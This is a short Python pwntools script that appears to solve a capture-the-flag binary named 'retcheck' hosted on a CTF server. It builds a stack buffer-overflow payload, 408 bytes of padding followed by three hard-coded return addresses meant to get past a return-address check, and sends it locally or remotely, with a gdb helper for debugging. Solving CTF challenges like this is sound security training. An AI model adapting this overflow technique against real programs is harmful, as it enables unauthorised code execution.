#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import time
import binascii

context.update(arch='amd64')
exe = './retcheck'
HOST = 'challenge.ctf.games'
PORT = 31463

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

# $ python3 solve.py DEBUG GDB NOASLR
gdbscript = '''
b main
b *0x0000000000401446
c
c
p (int)RETADDR
x/200x $rsp
'''.format(**locals())

p = start()
p.recvline()
payload = b"A" * 408 #buffer pad
payload += p64(0x401465) #vuln() rip
payload += p64(0x401400) #gets() addr
payload += p64(0x4012e9) #main() rip
p.sendline(payload)
print(p.recvline())

